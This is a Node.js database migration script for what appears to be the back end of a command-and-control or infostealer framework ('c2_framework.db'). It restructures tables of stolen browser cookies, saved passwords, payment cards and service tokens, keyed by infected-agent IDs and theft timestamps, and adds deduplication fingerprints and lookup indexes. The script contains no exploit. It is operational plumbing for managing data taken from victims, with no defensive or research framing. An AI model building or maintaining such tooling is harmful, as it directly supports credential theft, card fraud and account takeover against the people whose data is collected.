const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const db = new sqlite3.Database('./c2_framework.db');

db.serialize(() => {
    console.log('🔄 Starting migration...');
    
    // Step 1: Add fingerprint columns
    console.log('📝 Adding fingerprint columns...');
    db.run("ALTER TABLE stolen_cookies ADD COLUMN fingerprint TEXT", (err) => {
        if (err && !err.message.includes('duplicate column name')) {
            console.error('Error adding fingerprint to cookies:', err.message);
        } else {
            console.log('✅ fingerprint column added to cookies');
        }
    });
    
    db.run("ALTER TABLE stolen_passwords ADD COLUMN fingerprint TEXT", (err) => {
        if (err && !err.message.includes('duplicate column name')) {
            console.error('Error adding fingerprint to passwords:', err.message);
        } else {
            console.log('✅ fingerprint column added to passwords');
        }
    });
    
    db.run("ALTER TABLE stolen_cards ADD COLUMN fingerprint TEXT", (err) => {
        if (err && !err.message.includes('duplicate column name')) {
            console.error('Error adding fingerprint to cards:', err.message);
        } else {
            console.log('✅ fingerprint column added to cards');
        }
    });
    
    db.run("ALTER TABLE stolen_tokens ADD COLUMN fingerprint TEXT", (err) => {
        if (err && !err.message.includes('duplicate column name')) {
            console.error('Error adding fingerprint to tokens:', err.message);
        } else {
            console.log('✅ fingerprint column added to tokens');
        }
    });
    
    // Step 2: Populate fingerprints
    console.log('📝 Populating fingerprints...');
    db.run(`UPDATE stolen_cookies SET fingerprint = LOWER(
        HEX(RANDOMBLOB(16)) || '|' ||
        COALESCE(agentId, '') || '|' ||
        COALESCE(host, '') || '|' ||
        COALESCE(name, '') || '|' ||
        COALESCE(path, '') || '|' ||
        COALESCE(value, '')
    )`, (err) => {
        if (err) console.error('Error updating cookies:', err.message);
        else console.log('✅ Cookies fingerprints populated');
    });
    
    db.run(`UPDATE stolen_passwords SET fingerprint = LOWER(
        HEX(RANDOMBLOB(16)) || '|' ||
        COALESCE(agentId, '') || '|' ||
        COALESCE(url, '') || '|' ||
        COALESCE(username, '') || '|' ||
        COALESCE(password, '')
    )`, (err) => {
        if (err) console.error('Error updating passwords:', err.message);
        else console.log('✅ Passwords fingerprints populated');
    });
    
    db.run(`UPDATE stolen_cards SET fingerprint = LOWER(
        HEX(RANDOMBLOB(16)) || '|' ||
        COALESCE(agentId, '') || '|' ||
        COALESCE(card_number, '') || '|' ||
        COALESCE(card_name, '')
    )`, (err) => {
        if (err) console.error('Error updating cards:', err.message);
        else console.log('✅ Cards fingerprints populated');
    });
    
    db.run(`UPDATE stolen_tokens SET fingerprint = LOWER(
        HEX(RANDOMBLOB(16)) || '|' ||
        COALESCE(agentId, '') || '|' ||
        COALESCE(service, '') || '|' ||
        COALESCE(token, '')
    )`, (err) => {
        if (err) console.error('Error updating tokens:', err.message);
        else console.log('✅ Tokens fingerprints populated');
    });
    
    // Step 3: Drop global unique indexes
    console.log('📝 Dropping old indexes...');
    db.run("DROP INDEX IF EXISTS idx_unique_cookie_global", (err) => {
        if (err) console.error('Error dropping cookie index:', err.message);
        else console.log('✅ Dropped idx_unique_cookie_global');
    });
    db.run("DROP INDEX IF EXISTS idx_unique_password_global", (err) => {
        if (err) console.error('Error dropping password index:', err.message);
        else console.log('✅ Dropped idx_unique_password_global');
    });
    db.run("DROP INDEX IF EXISTS idx_unique_card_global", (err) => {
        if (err) console.error('Error dropping card index:', err.message);
        else console.log('✅ Dropped idx_unique_card_global');
    });
    db.run("DROP INDEX IF EXISTS idx_unique_token_global", (err) => {
        if (err) console.error('Error dropping token index:', err.message);
        else console.log('✅ Dropped idx_unique_token_global');
    });
    
    // Step 4: Create new fingerprint indexes
    console.log('📝 Creating new indexes...');
    db.run("CREATE INDEX IF NOT EXISTS idx_cookie_agent_fingerprint ON stolen_cookies(agentId, fingerprint)", (err) => {
        if (err) console.error('Error creating cookie index:', err.message);
        else console.log('✅ Created idx_cookie_agent_fingerprint');
    });
    db.run("CREATE INDEX IF NOT EXISTS idx_password_agent_fingerprint ON stolen_passwords(agentId, fingerprint)", (err) => {
        if (err) console.error('Error creating password index:', err.message);
        else console.log('✅ Created idx_password_agent_fingerprint');
    });
    db.run("CREATE INDEX IF NOT EXISTS idx_card_agent_fingerprint ON stolen_cards(agentId, fingerprint)", (err) => {
        if (err) console.error('Error creating card index:', err.message);
        else console.log('✅ Created idx_card_agent_fingerprint');
    });
    db.run("CREATE INDEX IF NOT EXISTS idx_token_agent_fingerprint ON stolen_tokens(agentId, fingerprint)", (err) => {
        if (err) console.error('Error creating token index:', err.message);
        else console.log('✅ Created idx_token_agent_fingerprint');
    });
    
    // Step 5: Create performance indexes
    console.log('📝 Creating performance indexes...');
    db.run("CREATE INDEX IF NOT EXISTS idx_cookies_stolen_at ON stolen_cookies(stolen_at DESC)", (err) => {
        if (err) console.error('Error:', err.message);
        else console.log('✅ Created idx_cookies_stolen_at');
    });
    db.run("CREATE INDEX IF NOT EXISTS idx_passwords_stolen_at ON stolen_passwords(stolen_at DESC)", (err) => {
        if (err) console.error('Error:', err.message);
        else console.log('✅ Created idx_passwords_stolen_at');
    });
    db.run("CREATE INDEX IF NOT EXISTS idx_cards_stolen_at ON stolen_cards(stolen_at DESC)", (err) => {
        if (err) console.error('Error:', err.message);
        else console.log('✅ Created idx_cards_stolen_at');
    });
    db.run("CREATE INDEX IF NOT EXISTS idx_tokens_stolen_at ON stolen_tokens(stolen_at DESC)", (err) => {
        if (err) console.error('Error:', err.message);
        else console.log('✅ Created idx_tokens_stolen_at');
    });
    
    db.run("CREATE INDEX IF NOT EXISTS idx_cookies_agent_host ON stolen_cookies(agentId, host)", (err) => {
        if (err) console.error('Error:', err.message);
        else console.log('✅ Created idx_cookies_agent_host');
    });
    db.run("CREATE INDEX IF NOT EXISTS idx_passwords_agent_url ON stolen_passwords(agentId, url)", (err) => {
        if (err) console.error('Error:', err.message);
        else console.log('✅ Created idx_passwords_agent_url');
    });
    db.run("CREATE INDEX IF NOT EXISTS idx_cards_agent ON stolen_cards(agentId)", (err) => {
        if (err) console.error('Error:', err.message);
        else console.log('✅ Created idx_cards_agent');
    });
    
    // Step 6: Verify
    setTimeout(() => {
        console.log('\n📊 Verification:');
        db.get("SELECT COUNT(*) as count FROM stolen_cookies", (err, row) => {
            console.log(`   Cookies: ${row.count} rows`);
        });
        db.get("SELECT COUNT(*) as count FROM stolen_passwords", (err, row) => {
            console.log(`   Passwords: ${row.count} rows`);
        });
        db.get("SELECT COUNT(*) as count FROM stolen_cards", (err, row) => {
            console.log(`   Cards: ${row.count} rows`);
        });
        db.get("SELECT COUNT(*) as count FROM stolen_tokens", (err, row) => {
            console.log(`   Tokens: ${row.count} rows`);
        });
        
        setTimeout(() => {
            console.log('\n✅ Migration Complete!');
            db.close();
        }, 1000);
    }, 2000);
});

console.log('🔄 Running migration... Please wait.');